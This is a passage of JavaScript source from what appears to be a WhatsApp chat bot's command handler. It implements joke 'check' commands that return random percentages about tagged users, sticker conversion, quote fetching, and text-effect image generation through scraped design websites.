					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
client.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case '/toimg': {
	ZeroStickWait()
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replygcZero(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await client.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            client.sendMessage(from, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replygcZero(`Please reply to non animated sticker`)
    }
    break
case '/swm': case '/steal': case '/stickerwm': case '/take':{
if (!isPrem) return replyprem(mess.premium)
if (!args.join(" ")) return replygcZero(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
client.downloadAndSaveMediaMessage(quoted, "gifee")
client.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await client.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcZero('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await client.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcZero(`Photo/Video?`)
}
}
break
case '/qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replygcZero(`Where is the text?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await client.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await client.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      client.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replygcZero('Error')
    }
    }
    break
case '/s': case '/sticker': case '/stiker': {
if (!quoted) return replygcZero(`Send/Reply Images/Videos/Gifs With Captions ${prefixo+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await client.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcZero('Send/Reply Images/Videos/Gifs With Captions ${prefixo+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await client.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
replygcZero(`Send/Reply Images/Videos/Gifs With Captions ${prefixo+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case '/quotes':
const quoteZeroy = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteZeroy.data.quote.body}\n\n*${themeemoji} Author:* ${quoteZeroy.data.quote.author}`
return replygcZero(textquotes)
break
case '/handsomecheck':
				if (!text) return replygcZero(`Tag Someone, Example : ${prefixo + command} @Zero`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
client.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case '/beautifulcheck':
				if (!text) return replygcZero(`Tag Someone, Example : ${prefixo + command} @Zero`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
client.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case '/charactercheck':
					if (!text) return replygcZero(`Tag Someone, Example : ${prefixo + command} @Zero`)
					const Zeroy =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = Zeroy[Math.floor(Math.random() * Zeroy.length)]
					client.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case '/awesomecheck':
  case '/greatcheck':
    case '/gaycheck':
      case '/cutecheck':
        case '/lesbicheck':
          case '/lesbiancheck':
             case '/hornycheck':
                 case '/prettycheck':
                    case '/lovelycheck':
                      case '/uglycheck':
if (!m.isGroup) return ZeroStickGroup()
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
client.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
client.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
client.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case '/obfus': case '/obfuscate':{
if (!q) return replygcZero(`Example ${prefixo+command} const Zerobot = require('baileys')`)
let meg = await obfus(q)
replygcZero(`Success
${meg.result}`)
}
break
case '/style': case '/styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcZero('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcZero(teks)
	    }
	    break
case '/candy': 
case '/christmas': 
case '/3dchristmas': 
case '/sparklechristmas':
case '/deepsea': 
case '/scifi': 
case '/rainbow': 
case '/waterpipe': 
case '/spooky': 
case '/pencil': 
case '/circuit': 
case '/discovery': 
case '/metalic': 
case '/fiction': 
case '/demon': 
case '/transformer': 
case '/berry': 
case '/thunder': 
case '/magma': 
case '/3dstone': 
case '/neonlight': 
case '/glitch': 
case '/harrypotter': 
case '/brokenglass': 
case '/papercut': 
case '/watercolor': 
case '/multicolor': 
case '/neondevil': 
case '/underwater': 
case '/graffitibike':
case '/snow': 
case '/cloud': 
case '/honey': 
case '/ice': 
case '/fruitjuice': 
case '/biscuit': 
case '/wood': 
case '/chocolate': 
case '/strawberry': 
case '/matrix': 
case '/blood': 
case '/dropwater': 
case '/toxic': 
case '/lava': 
case '/rock': 
case '/bloodglas': 
case '/hallowen': 
case '/darkgold': 
case '/joker': 
case '/wicker':
case '/firework': 
case '/skeleton': 
case '/blackpink': 
case '/sand': 
case '/glue': 
case '/1917': 
case '/leaves': {

if (!q) return replygcZero(`Example : ${prefixo+command} client`) 
ZeroStickWait()
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
client.sendMessage(from, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
}
break
case '/glitchtext':
case '/writetext':
case '/advancedglow':
case '/typographytext':
case '/pixelglitch':
case '/neonglitch':
case '/flagtext':
case '/flag3dtext':
case '/deletingtext':
case '/blackpinkstyle':
case '/glowingtext':
case '/underwatertext':
case '/logomaker':
case '/cartoonstyle':
case '/papercutstyle':
case '/watercolortext':
case '/effectclouds':
case '/blackpinklogo':
case '/gradienttext':
case '/summerbeach':
case '/luxurygold':
case '/multicoloredneon':
case '/sandsummer':
case '/galaxywallpaper':
case '/1917style':
case '/makingneon':
case '/royaltext':
case '/freecreate':
case '/galaxystyle':
case '/lighteffects':{

if (!q) return replygcZero(`Example : ${prefixo+command} client`) 
ZeroStickWait()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
client.sendMessage(from, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case '/shadow': 
case '/write': 
case '/romantic': 
case '/burnpaper':
case '/smoke': 
case '/narutobanner': 
case '/love': 
case '/undergrass':
case '/doublelove': 
case '/coffecup':
case '/underwaterocean':
case '/smokyneon':
case '/starstext':
case '/rainboweffect':
case '/balloontext':
case '/metalliceffect':
case '/embroiderytext':
case '/flamingtext':
case '/stonetext':
case '/writeart':
case '/summertext':
case '/wolfmetaltext':
case '/nature3dtext':
case '/rosestext':
case '/naturetypography':
case '/quotesunder':
case '/shinetext':{

if (!q) return replygcZero(`Example : ${prefixo+command} client`) 
ZeroStickWait()
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
client.sendMessage(from, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
case '/pornhub':{
if(!q) return replygcZero(`Example: ${prefixo + command} ajg | ea`)
ZeroStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await textpro2("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
client.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
}
break
case '/retro':{
if(!q) return replygcZero(`Example: ${prefixo + command} ajg | ea`)
ZeroStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await textpro2("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
client.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
}
break
case '/8bit':{
if(!q) return replygcZero(`Example: ${prefixo + command} ajg | ea`)
ZeroStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await textpro2("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
client.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
}
break
case '/batman':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err))
   break
case '/3dbox':
if(!q) return replygcZero(`Example: ${prefixo + command} ea`)
ZeroStickWait()
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
case '/lion':
  if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break
case '/3davengers':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 
case '/window':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/3dspace':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg | ea`)
ZeroStickWait()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/bokeh':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/holographic':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/thewall':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 
